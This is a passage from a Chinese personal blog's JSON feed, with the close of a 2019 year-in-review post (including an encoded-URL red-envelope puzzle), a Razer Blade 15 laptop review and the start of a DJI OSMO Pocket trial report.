175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90#\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 